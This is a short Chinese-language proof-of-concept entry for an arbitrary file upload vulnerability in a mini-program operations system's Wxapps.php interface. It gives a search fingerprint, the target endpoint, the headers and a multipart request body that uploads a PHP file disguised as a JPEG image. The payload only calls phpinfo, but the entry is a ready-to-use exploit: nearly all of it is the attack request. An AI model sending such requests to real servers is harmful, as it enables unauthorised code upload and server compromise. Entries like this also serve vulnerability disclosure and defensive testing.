# 全行业小程序运营系统接口Wxapps.php存在任意文件上传漏洞

- **系统**：全行业小程序运营系统接口　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`"/com/css/head_foot.css"`
- **请求**：`POST /api/wxapps/wxupimg HTTP/1.1`
- **关键头**：`Content-Length: 197`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNGBhBIC6…`　`Host: 127.0.0.1:81`　`sec-fetch-user: ?1`

**请求体 / payload**
```
------WebKitFormBoundary03rNBzFMIytvpWhy
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/jpeg
<?php phpinfo();?>
------WebKitFormBoundary03rNBzFMIytvpWhy--
```
- **预期**：200　|　—